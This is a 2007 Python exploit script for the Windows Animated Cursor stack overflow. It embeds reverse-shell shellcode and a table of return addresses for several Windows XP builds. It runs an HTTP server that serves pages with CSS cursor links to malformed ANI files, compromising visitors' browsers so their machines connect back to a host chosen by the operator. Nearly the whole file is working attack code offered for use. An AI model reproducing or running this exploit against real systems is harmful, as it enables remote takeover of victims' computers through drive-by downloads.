Microsoft Windows Animated Cursor Stack Overflow Exploit
========================================================

#!/usr/bin/env python

#
#   $Id: win32-loadaniicon.py 4 2007-06-02 00:47:59Z ramon $
#
#   Windows Animated Cursor Stack Overflow Exploit
#   Copyright 2007 Ramon de Carvalho Valle <ramon@risesecurity.org>,
#   RISE Security <contact@risesecurity.org>
#
#   This program is free software; you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation; either version 2 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program; if not, write to the Free Software
#   Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
#

#
# Windows Animated Cursor Stack Overflow Vulnerability
# http://www.determina.com/security.research/vulnerabilities/ani-header.html
#

from BaseHTTPServer import *
from os.path import *
from random import *
from socket import *
from string import *
from struct import *
from sys import *

#
#  windows/shell_reverse_tcp - 287 bytes
#  http://www.metasploit.com
#  EXITFUNC=seh, LPORT=1234, LHOST=127.0.0.1
#
buf = \
&#039;\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b&#039; + \
&#039;\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01&#039; + \
&#039;\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07&#039; + \
&#039;\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f&#039; + \
&#039;\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b&#039; + \
&#039;\x89\x6c\x24\x1c\x61\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c&#039; + \
&#039;\x8b\x70\x1c\xad\x8b\x40\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff&#039; + \
&#039;\xd6\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\xff\xd0&#039; + \
&#039;\x68\xcb\xed\xfc\x3b\x50\xff\xd6\x5f\x89\xe5\x66\x81\xed\x08&#039; + \
&#039;\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09\xf5\xad\x57\xff\xd6\x53&#039; + \
&#039;\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x68\x7f\x00\x00\x01\x66&#039; + \
&#039;\x68\x04\xd2\x66\x53\x89\xe1\x95\x68\xec\xf9\xaa\x60\x57\xff&#039; + \
&#039;\xd6\x6a\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68\x63\x6d\x6a&#039; + \
&#039;\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3\xaa\x95&#039; + \
&#039;\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab\x68&#039; + \
&#039;\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51\x51\x51&#039; + \
&#039;\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53\xff&#039; + \
&#039;\xd6\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6\x79\xff\x75\x04&#039; + \
&#039;\xff\xd6\xff\x77\xfc\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6&#039; + \
&#039;\xff\xd0&#039;

# Target list
target = [ \
    # call [ebx+4]

    # Microsoft Windows XP SP2 user32.dll (5.1.2600.2622) Multi Language
    {&#039;addr&#039;: 0x25ba, &#039;len&#039;: 2, &#039;offset&#039;: 80},

    # Microsoft Windows XP SP2 user32.dll (5.1.2600.2180) Multi Language
    {&#039;addr&#039;: 0x25d0, &#039;len&#039;: 2, &#039;offset&#039;: 80},

    # Microsoft Windows XP SP2 userenv.dll (5.1.2600.2180) English
    {&#039;addr&#039;: 0x769fc81a, &#039;len&#039;: 4, &#039;offset&#039;: 80},

    # Microsoft Windows XP SP2 user32.dll (5.1.2600.2180) English
    # {&#039;addr&#039;: 0x77d825d0, &#039;len&#039;: 4, &#039;offset&#039;: 80},

    # Microsoft Windows XP SP2 userenv.dll (5.1.2600.2180) Portuguese (Brazil)
    {&#039;addr&#039;: 0x769dc81a, &#039;len&#039;: 4, &#039;offset&#039;: 80},

    # Microsoft Windows XP SP2 user32.dll (5.1.2600.2180) Portuguese (Brazil)
    # {&#039;addr&#039;: 0x77d625d0, &#039;len&#039;: 4, &#039;offset&#039;: 80},

    # call [esi+4]

    # Microsoft Windows XP SP1a userenv.dll English
    {&#039;addr&#039;: 0x75a758b1, &#039;len&#039;: 4, &#039;offset&#039;: 80},

    # Microsoft Windows XP SP1a shell32.dll English
    # {&#039;addr&#039;: 0x77441a66, &#039;len&#039;: 4, &#039;offset&#039;: 80},

    # Microsoft Windows XP userenv.dll (5.1.2600.0) Portuguese (Brazil)
    {&#039;addr&#039;: 0x75a4579b, &#039;len&#039;: 4, &#039;offset&#039;: 80},

    # Microsoft Windows XP shell32.dll (6.0.2600.0) Portuguese (Brazil)
    # {&#039;addr&#039;: 0x77427214, &#039;len&#039;: 4, &#039;offset&#039;: 80},
]

# Target list index
tidx = 0

def randstr(count = 1, charset = &#039;ascii_alpha&#039;):
    # Set the charset
    if charset == &#039;ascii_alpha&#039;:
        charset = digits + ascii_uppercase + ascii_lowercase
    elif charset == &#039;ascii_letters&#039;:
        charset = ascii_letters
    elif charset == &#039;ascii_lowercase&#039;:
        charset = ascii_lowercase
    elif charset == &#039;ascii_uppercase&#039;:
        charset = ascii_uppercase
    elif charset == &#039;digits&#039;:
        charset = digits
    elif charset == &#039;hexdigits&#039;:
        charset = hexdigits
    elif charset == &#039;octdigits&#039;:
        charset = octdigits

    # Create the string
    i = 0
    str = &#039;&#039;

    while i < count:
        str = str + charset[randint(0, len(charset)-1)]
        i = i + 1

    return str


def riff_chunk():
    chunk_id = randstr(4)
    chunk_data = randstr(randint(1, 256)*2)
    chunk_size = pack(&#039;<L&#039;, len(chunk_data))

    return chunk_id + chunk_size + chunk_data


def riff_ani_file():
    global buf, target, tidx

    # Create the first header subchunk
    anih_a = [36, randint(1, 65535), randint(1, 65535), 0, 0, 0, 0, 0, 1]
    anih_a = pack(&#039;<%dL&#039; % len(anih_a), *[i for i in anih_a])
    anih_a = &#039;anih&#039; + pack(&#039;<L&#039;, len(anih_a)) + anih_a

    # Create the second header subchunk
    anih_b = randstr(target[tidx][&#039;offset&#039;])

    # Set the current indexed target
    if target[tidx][&#039;len&#039;] == 1:
        anih_b = anih_b + pack(&#039;<B&#039;, target[tidx][&#039;addr&#039;])
    elif target[tidx][&#039;len&#039;] == 2:
        anih_b = anih_b + pack(&#039;<H&#039;, target[tidx][&#039;addr&#039;])
    else:
        anih_b = anih_b + pack(&#039;<L&#039;, target[tidx][&#039;addr&#039;])

    anih_b = &#039;anih&#039; + pack(&#039;<L&#039;, len(anih_b)) + anih_b

    # Format ID
    riff = &#039;ACON&#039;

    # Random subchunks
    for i in range(randint(1, 256)):
        riff = riff + riff_chunk()

    # First header subchunk
    riff = riff + anih_a

    # Random subchunks
    for i in range(randint(1, 256)):
        riff = riff + riff_chunk()

    # Second header subchunk
    riff = riff + anih_b

    # Shellcode
    riff = riff + buf

    # File ID and length of file
    riff = &#039;RIFF&#039; + pack(&#039;<L&#039;, len(riff)) + riff

    # Update the target list index
    if tidx < len(target)-1:
        tidx = tidx + 1
    else:
        tidx = 0

    return riff


def randhtml():
    global buf, target, tidx

    # Random RIFF file extensions
    extension = [&#039;ani&#039;, &#039;avi&#039;, &#039;cdr&#039;, &#039;rmi&#039;, &#039;wav&#039;]

    # Random html document
    html = \
    &#039;<html>\n<head>\n<title>&#039; + \
    randstr(randint(1, 256)) + \
    &#039;</title>\n</head>\n<body>\n&#039;

    for i in range(randint(0, 4)):
        html = html + randstr(randint(1, 256)) + &#039;\n&#039;

    for i in range(len(target)):
        html = html + \
        &#039;<div id="&#039; + randstr(randint(4, 16)) + &#039;" &#039; \
        &#039;style="cursor: url(/&#039; + randstr(randint(4, 16)) + &#039;.&#039; + \
        extension[randint(0, len(extension)-1)] + &#039;)">\n&#039;

        for i in range(randint(0, 4)):
            html = html + randstr(randint(1, 256)) + &#039;\n&#039;

        html = html + &#039;</div>\n&#039;

        for i in range(randint(0, 4)):
            html = html + randstr(randint(1, 256)) + &#039;\n&#039;

    html = html + &#039;</body>\n</html>\n&#039;

    return html


class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)

        if self.path == &#039;/&#039;:
            # Send the html document
            html = randhtml()
            self.send_header(&#039;Content-Type&#039;, &#039;text/html; charset=UTF-8&#039;)
            self.send_header(&#039;Content-Length&#039;, str(len(html)))
            self.end_headers()
            self.wfile.write(html)
            return

        # Generate and send the RIFF file
        riff = riff_ani_file()
        self.send_header(&#039;Content-Type&#039;, &#039;application/octetstream&#039;)
        self.send_header(&#039;Content-Length&#039;, str(len(riff)))
        self.end_headers()
        self.wfile.write(riff)


def usage():
    print &#039;Usage: ./%s <http_host> <http_port> <host> <port>&#039; \
    % basename(argv[0])


if __name__ == &#039;__main__&#039;:
    print &#039;Windows Animated Cursor Stack Overflow Exploit&#039;
    print &#039;Copyright 2007 RISE Security <contact@risesecurity.org>\n&#039;

    args = argv[1:]

    if &#039;-h&#039; in args or &#039;--help&#039; in args:
        usage()
        exit()

    http_host = &#039;0.0.0.0&#039;
    http_port = 8080
    host = &#039;127.0.0.1&#039;
    port = 1234

    try:
        http_host = argv[1]
        http_port = atoi(argv[2])
        host = argv[3]
        port = atoi(argv[4])
    except:
        pass

    # Set shellcode host and port to connect to
    buf = buf[:160] + inet_aton(gethostbyname(host)) + buf[164:]
    buf = buf[:166] + pack(&#039;<H&#039;, port) + buf[168:]

    # Start the HTTP server
    server_class = HTTPServer
    httpd = server_class((http_host, http_port), RequestHandler)

    print &#039;Listening on %s:%s&#039; % (http_host, http_port)

    try:
        httpd.serve_forever()
    except:
        pass



